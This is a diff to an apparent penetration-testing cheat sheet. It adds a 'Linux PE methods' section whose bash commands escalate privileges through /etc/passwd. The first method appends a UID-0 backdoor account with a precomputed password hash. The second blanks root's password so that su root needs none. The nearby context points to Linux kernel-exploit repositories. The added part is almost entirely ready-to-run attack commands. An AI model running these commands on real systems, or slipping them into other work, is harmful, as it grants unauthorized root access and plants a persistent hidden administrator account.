@@ -744,6 +744,20 @@ gcc -shared -o /home/user/custom.so -fPIC /home/user/custom.c
 - https://github.com/SecWiki/linux-kernel-exploits
 - https://github.com/xairy/linux-kernel-exploitation
 
+## Linux PE methods
+- Editing /etc/passwd File (https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
+```bash
+#method 1
+openssl passwd raj
+echo 'aarti:$1$cJ05ZYPP$06zg1KtuJ/CbzTWPmeyNH1:0:0:root:/root:/bin/bash' >> /etc/passwd
+su aarti
+
+#method 2
+Keep the root password blank and save the /etc/passwd file.
+root::0:0:root:/root:/bin/bash
+su root
+```
+
 # Active Directory Pentesting
 ## Enumeration
 - To check local administrators in domain joined machine
